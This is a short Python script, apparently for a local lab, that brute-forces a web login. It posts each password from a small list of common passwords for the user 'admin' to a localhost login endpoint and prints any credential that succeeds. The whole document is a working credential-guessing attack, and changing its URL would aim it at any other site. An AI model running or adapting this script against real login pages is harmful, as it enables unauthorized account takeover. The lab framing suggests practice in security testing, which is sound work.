import requests


def brute_force_sim(url, username, wordlist):

    for pwd in wordlist:

        r = requests.post(
            url,
            data={
                "username": username,
                "password": pwd
            },
            timeout=50
        )

        # Sirf actual successful login ko success samjho
        if "Login Successful!" in r.text:

            print(f"[+] FOUND: {username}:{pwd}")
            return pwd

        else:
            print(f"[-] Failed: {pwd}")

    print("[-] Password not found")
    return None


# Local lab wordlist
wordlist = [
    "123456",
    "password",
    "admin123",
    "letmein",
    "qwerty",
    "admin123"
]


brute_force_sim(
    "http://127.0.0.1:5000/login",
    "admin",
    wordlist
)
